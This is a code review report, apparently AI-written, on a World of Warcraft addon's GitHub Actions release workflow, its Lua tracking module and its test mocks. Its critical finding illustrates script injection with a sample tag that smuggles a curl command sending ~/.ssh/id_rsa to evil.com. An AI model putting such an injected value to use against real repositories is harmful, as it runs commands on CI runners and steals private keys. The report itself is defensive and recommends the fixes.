---
phase: 04-performance-caching-and-ci-cd
reviewed: 2026-06-18T12:51:59Z
depth: standard
files_reviewed: 4
files_reviewed_list:
  - .github/workflows/release.yml
  - Duncedmaxxing/Modules/TipOfTheSpear.lua
  - spec/support/init.lua
  - spec/tip_spec.lua
findings:
  critical: 1
  warning: 4
  info: 2
  total: 7
status: issues_found
---

# Phase 4: Code Review Report

**Reviewed:** 2026-06-18T12:51:59Z
**Depth:** standard
**Files Reviewed:** 4
**Status:** issues_found

## Summary

Reviewed the CI/CD workflow (`release.yml`), the main tracking module (`TipOfTheSpear.lua`), and the new test infrastructure (`spec/support/init.lua`, `spec/tip_spec.lua`). The addon source code is solid with careful pcall guards and edge-case handling. The primary concern is a GitHub Actions script injection vulnerability in the release workflow. The test suite is well-structured but the mock clock has a subtle callback-ordering defect that could produce false-positive test results under certain timer interaction scenarios. One test has a misleading causal assertion.

## Critical Issues

### CR-01: GitHub Actions script injection via `github.ref_name` interpolation

**File:** `.github/workflows/release.yml:38`
**Issue:** `github.ref_name` is interpolated directly into a `run:` shell block using `${{ }}` syntax on lines 38 and 45. This is a well-documented GitHub Actions script injection pattern (CWE-78). A collaborator who creates a release with a tag containing shell metacharacters (e.g., `v1.0"; curl evil.com/exfil?t=$(cat ~/.ssh/id_rsa); echo "`) can execute arbitrary commands in the runner context. While this requires repository write access (release creation), a compromised collaborator account or a repository with relaxed branch protection makes exploitation feasible. The `GITHUB_TOKEN` available to the runner can modify repository contents, create releases, and access any secrets configured for the workflow.
**Fix:** Pass `github.ref_name` via an environment variable instead of inline interpolation:
```yaml
- name: Inject version into TOC
  env:
    TAG: ${{ github.ref_name }}
  run: |
    VERSION="${TAG#v}"
    echo "Injecting version: $VERSION"
    sed -i "s/^## Version: .*/## Version: $VERSION/" Duncedmaxxing/Duncedmaxxing.toc

- name: Create zip
  env:
    TAG: ${{ github.ref_name }}
  run: |
    VERSION="${TAG#v}"
    zip -r "Duncedmaxxing-$VERSION.zip" Duncedmaxxing/
```

## Warnings

### WR-01: Mock clock does not re-check `cancelled` flag before firing callbacks

**File:** `spec/support/wow_stubs.lua:34-40`
**Issue:** The `mockClock:advance()` method collects all eligible timer indices into a `fired` list, then iterates and fires them. If a callback cancels a timer that is later in the `fired` list (e.g., `ScheduleExpiration` cancels a prior `expireTimer`), the cancelled timer still fires because the `cancelled` flag is only checked once during collection (line 28), not before each `t.callback()` invocation (line 39). In production WoW, `C_Timer.NewTimer:Cancel()` prevents the callback from ever executing. This divergence means tests could pass even when addon code depends on timer cancellation semantics that the mock does not faithfully reproduce. Current tests happen to avoid this path, but any future test involving timer cancellation during callbacks will produce incorrect results.
**Fix:** Re-check the `cancelled` flag before firing each callback:
```lua
for _, idx in ipairs(fired) do
    local t = self.timers[idx - offset]
    table.remove(self.timers, idx - offset)
    offset = offset + 1
    if not t.cancelled then
        t.callback()
    end
end
```

### WR-02: `softprops/action-gh-release` pinned to major version tag, not SHA

**File:** `.github/workflows/release.yml:50`
**Issue:** The action `softprops/action-gh-release@v2` is pinned to a mutable major version tag. If the upstream repository is compromised, the attacker can push malicious code under the `v2` tag. This action runs with the workflow's `GITHUB_TOKEN` and has access to upload release assets. GitHub's own security hardening guide recommends pinning third-party actions to a full commit SHA.
**Fix:** Pin to the specific commit SHA of the current v2 release:
```yaml
- uses: softprops/action-gh-release@c062e08bd532815e2082a07b400ef65ab24e279c  # v2.3.2
```
(Verify the SHA matches the latest v2 tag at time of pinning.)

### WR-03: `prerelease: true` unconditionally marks every release as prerelease

**File:** `.github/workflows/release.yml:53`
**Issue:** The `prerelease: true` flag is hardcoded. When a user creates a stable (non-prerelease) GitHub release, the `package-release` job will override it back to prerelease status via the `softprops/action-gh-release` action. This means the workflow cannot produce stable releases without manual post-workflow intervention.
**Fix:** Either remove `prerelease: true` to preserve the release's original prerelease status, or make it conditional:
```yaml
prerelease: ${{ github.event.release.prerelease }}
```

### WR-04: Release workflow lacks explicit `permissions` declaration

**File:** `.github/workflows/release.yml:1-10`
**Issue:** The workflow does not declare a `permissions:` block. The `softprops/action-gh-release` action requires `contents: write` to upload release assets. Without explicit permissions, the workflow inherits the repository's default token permissions. If the repository's default is set to "Read repository contents and packages permissions" (GitHub's recommended restrictive default), the `Upload release asset` step will fail at runtime with a 403 error. This is a latent deployment failure.
**Fix:** Add an explicit permissions block scoped to the job that needs it:
```yaml
jobs:
  lint-and-test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    # ...

  package-release:
    needs: lint-and-test
    runs-on: ubuntu-latest
    if: github.event_name == 'release'
    permissions:
      contents: write
    # ...
```

## Info

### IN-01: Test "expiry timer fires after BUFF_DURATION" is causally misleading

**File:** `spec/tip_spec.lua:117-124`
**Issue:** The test asserts that stacks are zeroed after advancing the clock past `BUFF_DURATION`. However, `ApplySpell("generator")` also schedules cast-verify timers at 1.25s and 2.05s (via `ScheduleCastVerify`). With the default mock aura returning `nil`, these cast-verify timers fire first (at `fireAt = 101.25` and `102.05`, both before the expiry timer at `110.03`), and `SyncFromAura` zeros the stacks before the expiry timer runs. The expiry timer then fires but stacks are already 0. The test name implies the expiry timer is the causal mechanism, but it is the cast-verify timer that actually performs the zeroing. If the aura mock were changed to return live data, this test would break in unexpected ways.
**Fix:** To test the expiry timer in isolation, either (a) set `castVerifySerial` to a value that will mismatch after scheduling so the verify callbacks early-return, or (b) advance the clock in two steps: first past the verify timers (asserting stacks remain > 0 because mock aura returns valid data), then past the expiry time.

### IN-02: `FindTrackedSpell` iterates non-spell arguments from `UNIT_SPELLCAST_SUCCEEDED`

**File:** `Duncedmaxxing/Modules/TipOfTheSpear.lua:75-83`
**Issue:** `UNIT_SPELLCAST_SUCCEEDED` passes `(unitTarget, castGUID, spellID)` as arguments. `FindTrackedSpell(...)` iterates all three, running `ClassifySpellID` on the string `unitTarget` and string `castGUID` before reaching the numeric `spellID`. The string arguments always fail the checks (no false positives), but extracting `spellID` directly by position would be clearer and avoid unnecessary iterations.
**Fix:** Extract the spell ID by position in `OnEvent`:
```lua
elseif event == "UNIT_SPELLCAST_SUCCEEDED" then
    if not self.isSurvival then return end
    local _unit, _castGUID, spellID = ...
    local kind = ClassifySpellID(spellID)
    if kind then
        self:ApplySpell(kind, spellID)
    end
end
```

---

_Reviewed: 2026-06-18T12:51:59Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
